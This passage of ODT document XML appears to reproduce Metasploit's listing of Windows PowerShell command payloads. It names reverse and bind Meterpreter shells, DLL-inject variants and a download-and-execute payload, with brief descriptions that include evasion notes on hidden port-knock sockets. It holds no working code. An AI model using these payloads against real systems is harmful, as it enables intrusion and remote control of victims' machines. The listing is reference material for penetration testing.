      <text:p text:style-name="P1"><text:s text:c="4"/>_exec <text:s text:c="27"/>ommand via PowerShell. Download</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an EXE from an HTTP(S)/FTP URL</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>and execute it</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/exec <text:s text:c="5"/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/format_a <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ll_drives <text:s text:c="23"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/generic/ <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>debug_trap <text:s text:c="22"/>ommand via PowerShell. Generate</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a debug trap in the target pro</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cess</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/generic/ <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tight_loop <text:s text:c="22"/>ommand via PowerShell. Generate</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a tight loop in the target pro</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cess</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/loadlibr <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ary <text:s text:c="29"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/messageb <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ox <text:s text:c="30"/>ommand via PowerShell. Spawns a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>dialog via MessageBox using a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>customizable title, text &amp; icon</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_hidden_ipknock_tcp <text:s text:c="5"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection. First, the por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t will need to be knocked from</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the IP defined in KHOST. This I</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>P will work as an authenticatio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n method (you can spoof it with</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>tools like hping). After that</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you could get your shellcode fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om any IP. The socket will appe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ar as "closed," thus helping to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_hidden_tcp <text:s text:c="13"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection from a hidden p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort and spawn a command shell t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_ipv6_tcp <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_ipv6_tcp_uuid <text:s text:c="10"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_named_pipe <text:s text:c="13"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_nonx_tcp <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_tcp <text:s text:c="20"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_tcp_rc4 <text:s text:c="16"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/bind_tcp_uuid <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/find_tag <text:s text:c="20"/>ommand via PowerShell. Use an e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>stablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_hop_http <text:s text:c="12"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over an HTTP or HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TPS hop point. Note that you mu</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>st first upload data/hop/hop.ph</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>p to the PHP server you wish to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>use as a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_http <text:s text:c="16"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>ter/reverse_http_proxy_pstore <text:s text:c="3"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_https <text:s text:c="15"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTPS (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_https_proxy <text:s text:c="9"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP using SS</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>L with custom proxy support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_ipv6_tcp <text:s text:c="12"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_named_pipe <text:s text:c="10"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker via a name</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_nonx_tcp <text:s text:c="12"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_ord_tcp <text:s text:c="13"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_tcp <text:s text:c="17"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_tcp_allports <text:s text:c="8"/>ommand via PowerShell. Try to c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker, on</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>all possible ports (1-65535, s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_tcp_dns <text:s text:c="13"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_tcp_rc4 <text:s text:c="13"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_tcp_rc4_dns <text:s text:c="9"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_tcp_uuid <text:s text:c="12"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_winhttp <text:s text:c="13"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/meterpre <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter/reverse_winhttps <text:s text:c="12"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTPS (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s winhttp)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/powershell/metsvc_b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp <text:s text:c="25"/>ommand via PowerShell. Stub pay</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>load for interacting with a Met</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>erpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/metsvc_r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22"/>ommand via PowerShell. Stub pay</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>load for interacting with a Met</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>erpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_hidden_ipknock_tc <text:s/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>or a connection. First, the por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t will need to be knocked from</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the IP defined in KHOST. This I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P will work as an authenticatio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n method (you can spoof it with</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>tools like hping). After that</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you could get your shellcode fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om any IP. The socket will appe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ar as "closed," thus helping to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_hidden_tcp <text:s text:c="8"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection from a hidden p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort and spawn a command shell t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_ipv6_tcp <text:s text:c="10"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_ipv6_tcp_uuid <text:s text:c="5"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_named_pipe <text:s text:c="8"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_nonx_tcp <text:s text:c="10"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_tcp <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_tcp_rc4 <text:s text:c="11"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/bind_tcp_uuid <text:s text:c="10"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/find_tag <text:s text:c="15"/>ommand via PowerShell. Use an e</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>stablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_ipv6_tcp <text:s text:c="7"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_nonx_tcp <text:s text:c="7"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_ord_tcp <text:s text:c="8"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_tcp <text:s text:c="12"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_tcp_allports <text:s text:c="3"/>ommand via PowerShell. Try to c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker, on</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>all possible ports (1-65535, s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_tcp_dns <text:s text:c="8"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_tcp_rc4 <text:s text:c="8"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_tcp_rc4_dns <text:s text:c="4"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupd <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llinject/reverse_tcp_uuid <text:s text:c="7"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_hidden_ipknock_ <text:s/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>or a connection. First, the por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t will need to be knocked from</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the IP defined in KHOST. This I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P will work as an authenticatio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n method (you can spoof it with</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>tools like hping). After that</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you could get your shellcode fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om any IP. The socket will appe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ar as "closed," thus helping to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_hidden_tcp <text:s text:c="6"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection from a hidden p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort and spawn a command shell t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_ipv6_tcp <text:s text:c="8"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_ipv6_tcp_uuid <text:s text:c="3"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_named_pipe <text:s text:c="6"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_nonx_tcp <text:s text:c="8"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_tcp <text:s text:c="13"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_tcp_rc4 <text:s text:c="9"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/bind_tcp_uuid <text:s text:c="8"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/find_tag <text:s text:c="13"/>ommand via PowerShell. Use an e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>stablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_ipv6_tcp <text:s text:c="5"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_nonx_tcp <text:s text:c="5"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_ord_tcp <text:s text:c="6"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_tcp <text:s text:c="10"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_tcp_allports <text:s/>ommand via PowerShell. Try to c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker, on</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>all possible ports (1-65535, s</text:p>
